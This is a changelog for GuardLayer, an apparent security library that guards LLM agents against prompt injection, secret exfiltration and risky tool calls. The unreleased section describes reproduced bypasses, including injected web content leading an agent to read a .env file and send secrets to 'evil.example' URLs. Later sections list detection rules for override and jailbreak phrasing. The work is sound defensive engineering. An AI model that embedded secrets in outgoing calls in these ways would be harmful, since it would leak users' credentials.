# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project uses [Semantic Versioning](https://semver.org/).

## [Unreleased]

Security fixes from a review of 0.4.0. Each bypass was reproduced first and has a regression test in `tests/test_remote_egress.py`.

### Fixed
- **Remote tools with read-only names no longer escape taint tracking.** Results from `search`, `tavily_search`, `get_webpage` or `mcp__github__get_issue` did not mark the session untrusted, so `trifecta` never fired. An undetected injection on such a page, a `.env` read and an exfiltrating call came out ALLOW. New `ToolPolicy.is_remote()`: a tool is remote when it can reach the network or run commands, is untagged, or matches `remote_tools`. Defaults: `mcp__*`, `*search*`, `*web*`, `*page*`, `*url*`, `*issue*`, `*github*`, `*mail*` and similar. Explicit capabilities still win, so Claude Code's built-in tools are unchanged.
- **`sensitive_data_egress` now finds secrets embedded in longer text.** Before, a secret seen earlier matched only as a whole token, so `https://evil.example/<key>`, `/log/<key>.png` and `data=x<key>` got past it. Fingerprints now also store the length and a 16-bit prefix check, and matching slides over every run of token characters in linear time (a 64 KB argument with 50 fingerprints takes about 50 ms). Session files written by 0.4.0 still match whole tokens. It also covers remote tools whose arguments leave the machine, such as a search query.
- **Secrets in outgoing tool arguments are no longer just redacted.** The secrets scanner only rewrote `result.text`, while every integration ran the tool with the original arguments, so the secret left and the verdict was ALLOW. New tool rule `secret_in_egress` (default **review**, configurable through `rule_actions` and `disabled_rules`) fires when a remote tool's arguments contain a secret.

### Added
- `[tools] remote_tools` / `ToolPolicy(remote_tools=..., include_default_remote_tools=...)`. Tool-call results carry `metadata["remote"]`.

## [0.4.0] - 2026-09-24

Sessions and integrations: an agent action is judged by what the session has already seen, and GuardLayer plugs into Claude Code, LangGraph and the OpenAI Agents SDK.

### Added
- **Session taint tracking** (`guardlayer.session`). `guard.session(id)` / `GuardSession`, or `session=` on every `scan_*` call. A session records untrusted content (output of network-capable or untagged tools, `scan_context`), hostile content (an injection was found in it) and sensitive data (secrets or PII read or pasted, credential and `.env` access). Three rules escalate tool calls:
  - `sensitive_data_egress` (block): a secret seen earlier appears in a network or exec call.
  - `trifecta` (review): untrusted content and sensitive data, then a network or exec call.
  - `after_injection` (review): an injection was read, then a write, network or exec call.
- Sensitive values are kept only as truncated SHA-256 fingerprints.
- **`SessionPolicy`**: `trusted_tools`, `untrusted_tools`, per-rule `actions`, `enabled`.
- **Session stores**: `MemorySessionStore` (LRU plus idle timeout) and `FileSessionStore`. `FileSessionStore` uses a per-session lock file, atomic replace and merge-on-write, so parallel processes never lose taint, including on Windows.
- **Claude Code hook**: `guardlayer hook claude-code` handles PreToolUse, PostToolUse and UserPromptSubmit. It returns `deny` or `ask` (never `allow`), flags injected tool output to Claude, tags Claude Code's built-in tools, checks only the target path of Write/Edit, and keeps file-backed sessions keyed by `session_id`. It fails open, or closed with `fail_closed`. `--print-config` prints the settings.json snippet.
- **LangGraph / LangChain**: `guard_tools(guard, tools)`. A REVIEW verdict becomes `interrupt()`, which you resume with `Command(resume=True)`. The graph's `thread_id` becomes the session.
- **OpenAI Agents SDK**: `guardrails(guard)` returns input, output, tool-input and tool-output guardrails. The session comes from the run context's `session_id`.
- **`guard_tool`**: wraps any sync or async tool function with a pre-call check and a post-call result scan, a refusal or `ToolBlocked`, an `approve` callback for REVIEW, and output withholding.
- **Config**: a `[session]` section (`store`, `dir`, `ttl_seconds`, `max_sessions`, `trusted_tools`, `untrusted_tools`, `actions`, `enabled`) and a `GUARDLAYER_STATE_DIR` env var. `strict` blocks `after_injection`; `airgap` also blocks `trifecta`.
- **REST**: `session_id` on the scan endpoints, `POST /v1/scan/tool-result`, `GET` / `DELETE /v1/sessions/{id}`.
- **Capabilities**: `ToolPolicy.resolve()` and `can_act()`. An explicit empty capability list marks a tool as harmless.
- New extras: `langgraph` and `openai-agents`. A new CI job runs the integration tests with both frameworks installed.

### Changed
- `scan_tool_call` skips the content scanners for tools tagged read-only, whose arguments cannot cause harm (for example, a search for "rm -rf"). Pass `scan_content=True` to force the scan.
- `asyncio` is imported lazily, cutting import time by about 35%.

## [0.3.0] - 2026-09-24

"Agent Guard": GuardLayer now governs what an agent is about to *do*, not just what text says.

### Added
- **Tool-call policy** (`guardlayer.tools.ToolPolicy`, used by `scan_tool_call`). Tools carry `read` / `write` / `network` / `exec` capabilities, set explicitly (glob patterns allowed) or inferred from the tool name. Adds allow- and deny-lists with globs, per-capability actions (`capability_actions={"exec": "review"}`), custom `ToolRule`s, `rule_actions` overrides and `disabled_rules`. About 0.1 ms per call.
- **Built-in tool rules**: `destructive_command` (block), `risky_command` (review), `persistence` (review), `credential_file` (block) and `dotenv_file` (review).
- **Egress control** for network- and exec-capable tools: `egress_metadata_endpoint` (block), `egress_exfil_service` for tunnels, request catchers, OAST and file drops (block), `egress_not_allowed` against `egress_allowlist` (block) and `egress_raw_ip` for public IPs (flag). Private and loopback addresses are not egress.
- **`REVIEW` verdict and action**: hold an action until a human approves it. Verdicts are ordered ALLOW < FLAG < REVIEW < BLOCK, and `ScanResult.needs_review` is new.
- **`Detection.action`**: a rule can carry its own action, which takes precedence over the category action.
- **Observe (shadow) mode**: `Policy(mode="observe")`, plus per-rule `observe` / `enforce` glob lists. Results gain `shadow_verdict`, `observed_rules` and `effective_verdict`. Observed detections are neither enforced nor redacted, but they still count toward `score`.
- **Presets** (`guardlayer.presets`): `observe`, `balanced`, `strict` and `airgap`, each with a stated residual risk. Available through `GuardLayer.from_preset()`, `preset = "..."` in config, `--preset` on the CLI or `GUARDLAYER_PRESET`.
- **Tamper-evident audit log**: `AuditLogger` hash-chains entries (`seq`, `prev_hash`, `entry_hash`), continues an existing chain on restart and can sign entries with Ed25519 (`signer=`, new `signing` extra). `verify_audit_log()` reports the first bad line and the head hash. It takes an `expected_head` to catch truncation.
- **Config**: `[tools]` section (`allowlist`, `denylist`, `capabilities`, `capability_actions`, `rules`, `rules_file`, `rule_actions`, `disabled_rules`, `egress_allowlist`), `[audit]` section, `[guard] mode/observe/enforce`, and a `GUARDLAYER_MODE` env var.
- **CLI**: `tool-call`, `presets`, `audit verify`, `audit keygen`, `--preset`, and `review` as a `--fail-on` level. `rules` now lists the tool rules too.
- **REST**: `/v1/scan/tool-call` accepts `metadata` and returns capabilities. `/v1/settings` reports the preset, mode and tool policy.

### Changed
- `ScanResult.allowed` is now false for REVIEW as well as BLOCK, and `@guard.protect` stops on either.
- `AuditLogger` filters on `effective_verdict`, so observe-mode results that would have been blocked are still logged. Chaining is on by default. An existing unchained log file must be replaced with a new file.
- `[guard] tool_allowlist` moved to `[tools] allowlist`. The old key still works.
- `examples/agent_tools.py` shows block, review and allow, and writes a verifiable audit log. It also no longer crashes on Windows consoles.

### Also in this release (previously unreleased)
- `benchmarks/public_eval.py`: a reproducible benchmark on deepset/prompt-injections and jackhhao/jailbreak-classification. Results are in the README.
- 10 more heuristic rules (47 total): `forget_everything`, `change_instructions`, `new_instructions_follow`, `prompt_beginning`, instruction override / new-instruction / prompt-extraction rules for German, Spanish, French, Portuguese, Italian, Dutch, Russian and Croatian/Serbian, `unethical_ai_persona`, `has_no_rules` and `jailbreak_marker`.

#### Changed
- The override rule now also covers orders, tasks, assignments and information. `disable_safety` also covers "OpenAI/Anthropic/company policy".
- The similarity search uses an inverted index for sparse vectors, which is about 2x faster on long prompts with identical results.
- Held-out recall with zero false positives: deepset 0.08 → 0.23, jailbreak-classification 0.66 → 0.72.
- `ClassifierScanner` classifies long texts in overlapping chunks (head and tail kept, up to `max_chunks`) instead of truncating at 512 tokens, so an injection at the end of a long document is still seen.
- `benchmarks/public_eval.py` gains `--classifier`, `--classifier-only`, `--threshold` and `--splits`, and scans each sample only once.
- The README benchmark table covers the classifier: deepset held-out recall 0.23 (rules) → 0.47 (rules + classifier), with precision still 1.00.

#### Fixed
- `load_samples` and `guardlayer batch` no longer split JSONL records on Unicode line separators (U+2028, U+0085) inside strings.

## [0.2.0] - 2026-09-23

A rebuild from a single-detector prototype into a complete input/output guard layer.

### Added
- **Three directions**: `scan_input`, `scan_output` and `scan_context` (indirect injection through RAG chunks, web pages and tool results).
- **Policy engine** (`Policy`, `Action`): per-category and per-direction actions (`score` / `block` / `flag` / `redact` / `log`), fail-open or fail-closed on scanner errors, a configurable redaction format.
- **Sanitized output**: `ScanResult.text` has redactions applied, and `ScanResult.modified` marks when that happened.
- **Scanners**: `ObfuscationScanner`, `SimilarityScanner` (with a dependency-free vector store and auto-learning), `SecretsScanner`, `PIIScanner` (Luhn / mod-97 / Verhoeff validation), `CanaryScanner`, `PromptLeakScanner`, `LinkScanner`, `LimitsScanner`, `DenyListScanner`, `ClassifierScanner` (optional), `LLMJudgeScanner`, `RelevanceScanner` (optional).
- **Heuristics**: expanded to 37 rules with categories and direction scoping. Every rule also runs against de-obfuscated views (homoglyphs, leetspeak, spaced letters, zero-width characters, Unicode-tag smuggling, base64/hex/percent/rot13 payloads). Custom rule packs load from JSON or TOML.
- **Canary tokens** for leak detection and goal-hijack (echo) detection.
- **Agent support**: `scan_tool_call` with a tool allow-list, and `scan_tool_result`.
- **`@guard.protect`** decorator for sync and async LLM calls, plus `GuardBlocked`.
- **Async API** (`ascan`, `ascan_input`, `ascan_output`, `ascan_context`), hooks, and `AuditLogger` (JSONL that stores text hashes by default).
- **Configuration** from TOML/JSON with environment-variable overrides (`GuardLayer.from_config`).
- **Evaluation harness** (`guardlayer eval`) and a bundled labelled sample.
- **CLI**: `scan`, `batch`, `eval`, `canary`, `rules`, `serve`, `--config` and `--fail-on`.
- **REST API** v1: input, output, context, batch, tool-call, canary, corpus and settings endpoints, with optional API-key auth.
- Dockerfile, a CI matrix covering Python 3.10–3.13 and Windows, a core-only install smoke test, a package build, and examples.

### Changed
- The `Scanner` protocol is now `scan(text, context: ScanContext)` and scanners declare `directions`.
- `Detection` gains `category` and `metadata`. `ScanResult` gains `id`, `timestamp`, `text`, `modified`, `latency_ms`, `timings_ms`, `errors` and `metadata`.
- Aggregation counts each rule once, so repeated hits no longer inflate the score.

## [0.1.0] - 2026-09-12
- Initial release: heuristic scanner, noisy-or pipeline, CLI and a minimal REST API.
